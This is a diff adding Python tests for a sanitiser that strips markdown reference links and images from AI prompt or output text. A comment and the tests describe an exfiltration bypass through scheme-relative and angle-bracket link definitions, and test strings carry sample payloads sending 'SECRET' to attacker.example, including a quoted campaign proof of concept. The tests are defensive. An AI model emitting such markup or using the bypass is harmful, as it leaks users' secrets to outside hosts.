@@ -1008,6 +1008,75 @@ class TestWrapUntrusted:
         assert re.search(r"<untrusted-[0-9a-f]{16} ", out)
 
 
+# --- Autofetch strip: reference-style definitions and usages ---
+# Exfil rode the reference-definition arm's explicit-scheme requirement:
+# scheme-relative and angle-bracket destinations (both resolvable by
+# GFM/browser renderers) passed through, as did the reference-image
+# usage form. The strip is now destination-shape-agnostic.
+
+class TestAutofetchReferenceLinks:
+
+    def _strip(self, text):
+        from core.security.prompt_envelope import _strip_autofetch_markup
+        return _strip_autofetch_markup(text)
+
+    def test_scheme_relative_definition_stripped(self):
+        out = self._strip("[r]: //attacker.example/leak?d=SECRET")
+        assert "attacker.example" not in out
+        assert "[REDACTED-AUTOFETCH-MARKUP]" in out
+
+    def test_angle_bracket_definition_stripped(self):
+        out = self._strip("[r]: <https://attacker.example/leak?d=SECRET>")
+        assert "attacker.example" not in out
+
+    def test_angle_bracket_definition_with_spaces_stripped(self):
+        out = self._strip("[r]: <//attacker.example/a b c?d=SECRET>")
+        assert "attacker.example" not in out
+
+    def test_relative_path_definition_stripped(self):
+        # Destination shape does not matter — the renderer decides
+        # fetchability, so every definition is stripped.
+        out = self._strip("[r]: /leak?d=SECRET")
+        assert "SECRET" not in out
+
+    def test_next_line_destination_stripped(self):
+        out = self._strip("[r]:\n   //attacker.example/leak")
+        assert "attacker.example" not in out
+
+    def test_reference_image_usage_stripped(self):
+        out = self._strip("intro ![x][r] outro")
+        assert "![x][r]" not in out
+        assert "[REDACTED-AUTOFETCH-MARKUP]" in out
+
+    def test_collapsed_reference_image_usage_stripped(self):
+        out = self._strip("intro ![r][] outro")
+        assert "![r][]" not in out
+
+    def test_full_exfil_chain_stripped_via_sanitise_string(self):
+        # The exact campaign PoC, through the output-side consumer.
+        from core.security.prompt_output_sanitise import sanitise_string
+        out = sanitise_string(
+            "![x][r]\n\n[r]: //attacker.example/leak?d=SECRET")
+        assert "attacker.example" not in out
+        assert "![x][r]" not in out
+
+    def test_rust_macro_and_objc_negation_untouched(self):
+        for code in ("let v = vec![0; 10];",
+                     'println!["hi"];',
+                     "if (![arr count]) return;"):
+            assert self._strip(code) == code, code
+
+    def test_js_computed_key_untouched(self):
+        code = "const o = { [key]: value };"
+        assert self._strip(code) == code
+
+    def test_indented_code_block_definition_shape_untouched(self):
+        # 4+ columns of indent = code block in CommonMark; not a
+        # recognisable definition, so it must survive.
+        code = "      [computedKey]: value,"
+        assert self._strip(code) == code
+
+
 # --- Autofetch strip: over-long URL fallback (regression: >8KB evasion) ---
 
 class TestAutofetchOverlongFallback:
